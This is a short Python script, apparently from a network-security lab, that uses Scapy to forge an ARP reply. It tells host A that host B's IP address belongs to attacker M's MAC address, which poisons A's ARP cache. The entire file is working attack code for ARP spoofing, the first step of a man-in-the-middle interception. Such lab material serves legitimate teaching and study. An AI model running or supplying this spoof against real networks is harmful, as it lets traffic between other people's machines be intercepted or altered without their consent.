#!/usr/bin/python3
from scapy.all import *

# Machine addresses:
# M = 10.0.2.15, 08:00:27:e5:59:b7
# A = 10.0.2.4, 08:00:27:a7:61:71
# B = 10.0.2.5, 08:00:27:07:61:87

#target machine, A
A_IP = "10.0.2.4"
A_MAC = "08:00:27:a7:61:71"

# B's IP address
B_IP = "10.0.2.5"

#M's MAC address
M_MAC = "08:00:27:e5:59:b7"

#create ether object and set src to M's MAC and dst to A's MAC
e = Ether()
e.dst = A_MAC
e.src = M_MAC

#create an ARP reply object and set src IP to B's IP and src MAC to M's MAC address
a = ARP()
a.psrc = B_IP
a.hwsrc = M_MAC
a.pdst = A_IP
a.hwdst = A_MAC
a.op = 2

pkt = e/a
sendp(pkt)